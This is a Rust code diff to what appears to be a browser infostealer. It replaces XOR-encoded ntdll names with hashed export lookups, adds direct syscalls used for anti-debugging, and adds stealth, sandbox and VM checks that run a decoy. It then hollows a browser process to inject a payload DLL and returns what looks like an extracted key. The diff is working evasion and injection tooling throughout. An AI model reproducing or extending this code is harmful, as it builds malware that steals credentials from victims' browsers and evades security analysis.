@@ -1,4 +1,6 @@
+pub mod anti;
 mod browsers;
+mod hash;
 mod hollow;
 mod ipc;
 mod pe;
@@ -9,23 +11,31 @@ mod syscalls {
     //! Syscall numbers (SSN) are parsed from ntdll export stubs:
     //! `4C 8B D1 B8 XX XX XX XX` (`mov r10, rcx`; `mov eax, SSN`).
     //!
-    //! `SYSCALL_NUMBERS` index map:
-    //! - 0: `NtOpenProcess` — open a handle to a target process
-    //! - 1: `NtAllocateVirtualMemory` — reserve/commit remote memory
-    //! - 2: `NtWriteVirtualMemory` — write bytes into remote memory
-    //! - 3: `NtCreateThreadEx` — create a remote thread in a process
-    //! - 4: `NtReadVirtualMemory` — read bytes from remote memory
-    //! - 5: `NtProtectVirtualMemory` — change remote memory protection
-    //! - 6: `NtClose` — close a kernel object handle
+    //! `SYSCALL_NUMBERS` index map (resolved via DJB2 export hash, no plaintext names):
+    //! - 0: open process
+    //! - 1: allocate virtual memory
+    //! - 2: write virtual memory
+    //! - 3: create thread ex
+    //! - 4: read virtual memory
+    //! - 5: protect virtual memory
+    //! - 6: close handle
+    //! - 7: set information thread
+    //! - 8: query information process
 
     use core::arch::asm;
     use std::ffi::c_void;
     use std::mem;
     use std::sync::Once;
 
-    use windows::core::{PCSTR, PCWSTR};
-    use windows::Win32::Foundation::{HANDLE, HMODULE};
-    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
+    use windows::core::PCWSTR;
+use windows::Win32::Foundation::HANDLE;
+use windows::Win32::System::LibraryLoader::GetModuleHandleW;
+
+    use crate::hash::{
+        export_by_hash, H_NT_ALLOCATE_VIRTUAL_MEMORY, H_NT_CLOSE, H_NT_CREATE_THREAD_EX,
+        H_NT_OPEN_PROCESS, H_NT_PROTECT_VIRTUAL_MEMORY, H_NT_QUERY_INFORMATION_PROCESS,
+        H_NT_READ_VIRTUAL_MEMORY, H_NT_SET_INFORMATION_THREAD, H_NT_WRITE_VIRTUAL_MEMORY,
+    };
 
     pub type NTSTATUS = i32;
 
@@ -58,46 +68,8 @@ mod syscalls {
         pub unique_thread: *mut c_void,
     }
 
-    static mut SYSCALL_NUMBERS: Option<[usize; 7]> = None;
+    static mut SYSCALL_NUMBERS: Option<[usize; 9]> = None;
     static INIT: Once = Once::new();
-
-    fn s_nt_open_process() -> String {
-        super::xor_str(&[
-            0x14, 0x2E, 0x15, 0x2A, 0x3F, 0x34, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29,
-        ])
-    }
-
-    fn s_nt_allocate_virtual_memory() -> String {
-        super::xor_str(&[
-            0x14, 0x2E, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x3B, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E,
-            0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
-        ])
-    }
-
-    fn s_nt_write_virtual_memory() -> String {
-        super::xor_str(&[
-            0x14, 0x2E, 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36,
-            0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
-        ])
-    }
-
-    fn s_nt_read_virtual_memory() -> String {
-        super::xor_str(&[
-            0x14, 0x2E, 0x08, 0x3F, 0x3B, 0x3E, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17,
-            0x3F, 0x37, 0x35, 0x28, 0x23,
-        ])
-    }
-
-    fn s_nt_protect_virtual_memory() -> String {
-        super::xor_str(&[
-            0x14, 0x2E, 0x0A, 0x28, 0x35, 0x2E, 0x3F, 0x39, 0x2E, 0x0C, 0x33, 0x28, 0x2E, 0x2F,
-            0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
-        ])
-    }
-
-    fn s_nt_close() -> String {
-        super::xor_str(&[0x14, 0x2E, 0x19, 0x36, 0x35, 0x29, 0x3F])
-    }
 
     unsafe fn parse_syscall_number(addr: *const u8) -> Option<usize> {
         let bytes = std::slice::from_raw_parts(addr, 32);
@@ -120,12 +92,6 @@ mod syscalls {
         None
     }
 
-    unsafe fn resolve_syscall_number(module: HMODULE, name: &str) -> Option<usize> {
-        let cname = format!("{name}\0");
-        let addr = GetProcAddress(module, PCSTR(cname.as_ptr())).ok()?;
-        parse_syscall_number(addr as *const u8)
-    }
-
     pub fn init() {
         INIT.call_once(|| {
             unsafe {
@@ -135,19 +101,24 @@ mod syscalls {
                     Err(_) => return,
                 };
 
-                let names = [
-                    s_nt_open_process(),
-                    s_nt_allocate_virtual_memory(),
-                    s_nt_write_virtual_memory(),
-                    super::s_nt_create_thread_ex(),
-                    s_nt_read_virtual_memory(),
-                    s_nt_protect_virtual_memory(),
-                    s_nt_close(),
+                let base = ntdll.0 as *const u8;
+                let hashes = [
+                    H_NT_OPEN_PROCESS,
+                    H_NT_ALLOCATE_VIRTUAL_MEMORY,
+                    H_NT_WRITE_VIRTUAL_MEMORY,
+                    H_NT_CREATE_THREAD_EX,
+                    H_NT_READ_VIRTUAL_MEMORY,
+                    H_NT_PROTECT_VIRTUAL_MEMORY,
+                    H_NT_CLOSE,
+                    H_NT_SET_INFORMATION_THREAD,
+                    H_NT_QUERY_INFORMATION_PROCESS,
                 ];
 
-                let mut numbers = [0usize; 7];
-                for (idx, name) in names.iter().enumerate() {
-                    numbers[idx] = resolve_syscall_number(ntdll, name).unwrap_or(0);
+                let mut numbers = [0usize; 9];
+                for (idx, hash) in hashes.iter().enumerate() {
+                    numbers[idx] = export_by_hash(base, *hash)
+                        .and_then(|addr| parse_syscall_number(addr))
+                        .unwrap_or(0);
                 }
                 SYSCALL_NUMBERS = Some(numbers);
             }
@@ -452,10 +423,46 @@ mod syscalls {
         )
     }
 
-    /// Direct syscall for `NtClose` (SSN index 6).
+    /// Direct syscall (SSN index 6).
     pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
         init();
         do_syscall1(ssn(6), handle.0 as usize)
+    }
+
+    /// Direct syscall (SSN index 7).
+    pub unsafe fn nt_set_information_thread(
+        thread_handle: HANDLE,
+        info_class: u32,
+        info: *mut c_void,
+        info_len: u32,
+    ) -> NTSTATUS {
+        init();
+        do_syscall4(
+            ssn(7),
+            thread_handle.0 as usize,
+            info_class as usize,
+            info as usize,
+            info_len as usize,
+        )
+    }
+
+    /// Direct syscall (SSN index 8).
+    pub unsafe fn nt_query_information_process(
+        process_handle: HANDLE,
+        info_class: u32,
+        info: *mut c_void,
+        info_len: u32,
+        ret_len: *mut u32,
+    ) -> NTSTATUS {
+        init();
+        do_syscall5(
+            ssn(8),
+            process_handle.0 as usize,
+            info_class as usize,
+            info as usize,
+            info_len as usize,
+            ret_len as usize,
+        )
     }
 
     pub unsafe fn open_process(access: u32, pid: u32) -> Result<HANDLE, ()> {
@@ -560,13 +567,6 @@ fn s_ntdll() -> String {
     xor_str(&[0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36])
 }
 
-fn s_nt_create_thread_ex() -> String {
-    xor_str(&[
-        0x14, 0x2E, 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x1F,
-        0x22,
-    ])
-}
-
 pub(crate) fn s_nul() -> String {
     xor_str(&[0x14, 0x0F, 0x16])
 }
@@ -610,7 +610,11 @@ fn s_decoy_body() -> String {
 }
 
 fn is_debugger_attached() -> bool {
-    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
+    anti::debugger_present()
+}
+
+pub(crate) fn is_restricted_host() -> bool {
+    low_physical_memory() || low_cpu_count() || vm_drivers_present()
 }
 
 fn low_physical_memory() -> bool {
@@ -650,10 +654,6 @@ fn vm_drivers_present() -> bool {
         xor_str(&[0x32, 0x23, 0x2A, 0x3F, 0x28, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
     ];
     names.iter().any(|name| drivers.join(name).exists())
-}
-
-fn is_restricted_host() -> bool {
-    low_physical_memory() || low_cpu_count() || vm_drivers_present()
 }
 
 fn run_decoy() {
@@ -927,11 +927,8 @@ fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
 }
 
 pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
-    if is_debugger_attached() {
-        thread::sleep(Duration::from_secs(30));
-        return None;
-    }
-    if is_restricted_host() {
+    anti::apply_stealth();
+    if anti::is_host_restricted() {
         run_decoy();
         return None;
     }
@@ -946,7 +943,7 @@ pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     let profile_dir = env::temp_dir().join(format!("{tag}_p"));
 
     let mut cleanup = Cleanup::new();
-    cleanup.track_dir(profile_dir);
+    cleanup.track_dir(profile_dir.clone());
 
     env::set_var(s_user_data_env(), target.user_data_rel);
     env::set_var(
@@ -958,7 +955,8 @@ pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     );
     env::set_var(s_browser_name_env(), browser_name);
 
-    hollow::hollow_inject(&browser_exe, payload_dll, &profile_dir, &tag).ok()
+    let key = hollow::hollow_inject(&browser_exe, payload_dll, &profile_dir, &tag).ok();
+    key
 }
 
 pub(crate) fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
